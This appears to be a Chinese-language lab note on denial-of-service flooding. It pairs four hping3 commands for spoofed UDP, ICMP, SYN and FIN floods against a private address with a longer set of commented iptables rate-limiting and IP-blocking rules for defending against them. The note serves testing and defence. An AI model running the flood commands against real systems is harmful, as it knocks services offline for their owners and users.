# 攻击
```shell
# UDP flood
hping3  --udp --flood --rand-source 192.168.2.2 -p 567

# ICMP flood
hping3 --flood --icmp --rand-source 192.168.2.2

# SYN flood
hping3 -S -p 135 --flood -V --rand-source 192.168.2.2

# FIN flood
hping3 -F -p 135 --flood -V --rand-source 192.168.2.2
```

# 防御
## netfilter
```shell
# -w 等待xtable的锁，为了防止多个iptables程序同时进行
# syn
# 如果是tcp协议，并且 
# tcp flags 满足，检查 FIN,SYN,RST,ACK 其中 只有SYN被设置 并且
# conntrack 为 NEW 并且
# 获得令牌，令牌桶的容量为5，令牌生成的速率为每秒100个
# 当以上条件头匹配时，接受数据包
iptables -w -t filter -A $FW_DOS_CHAIN -p tcp --tcp-flags FIN,SYN,RST,ACK SYN -m conntrack --ctstate NEW -m limit --limit 100/s --limit-burst 5 -j ACCEPT

# fin
# tcp flags 满足，检查 FIN,SYN,RST,ACK 其中只有 FIN 被设置
iptables -w -t filter -A $FW_DOS_CHAIN -p tcp --tcp-flags FIN,SYN,RST,ACK FIN -m conntrack --ctstate INVALID -m limit --limit 100/s --limit-burst 5 -j ACCEPT

# udp
iptables -w -t filter -A $FW_DOS_CHAIN -p udp -m limit --limit 100/s --limit-burst 5 -j ACCEPT

# icmp
iptables -w -t filter -A $FW_DOS_CHAIN -p icmp -m limit --limit 100/s --limit-burst 5 -j ACCEPT

iptables -w -t filter -A $FW_DOS_CHAIN -p tcp --tcp-flags ALL SYN -m limit --limit 150/s --limit-burst 100 -j ACCEPT


# 使用最近匹配模块实现 ip block

# 创建一个最近匹配表 DDoS_SIP, 将数据包信息添加到此表中
# 注意不是 --update，而是 --set ，即当数据包第一次被添加到表中后，第二次同IP 端口的数据包到来时，不会更新表中信息, 关键是时间信息
# 所以如果数据包已经在表中了，相当于直接绕过，否则返回true，被ACCEPT
iptables -w -t filter -A $FW_DOS_CHAIN -m recent --set --name DDoS_SIP
# 一段时间 $ipblockTime 内，最多访问 20次，否则丢弃
iptables -w -t filter -A $FW_DOS_CHAIN -m recent --rcheck --name DDoS_SIP --seconds $ipblockTime --hitcount 20 -j LOG --log-prefix 'DDoS Block Source IP Blocking:'
iptables -w -t filter -A $FW_DOS_CHAIN -m recent --rcheck --seconds $ipblockTime --hitcount 20 --name DDoS_SIP -j DROP

# 限制单个IP
iptables -I INPUT -p tcp --tcp-flags FIN,SYN,RST,ACK SYN -m recent --set --name FLOOD_SYN
iptables -I INPUT -p tcp --tcp-flags FIN,SYN,RST,ACK SYN -m recent --update --seconds 3 --hitcount 3 --name FLOOD_SYN -j DROP
```
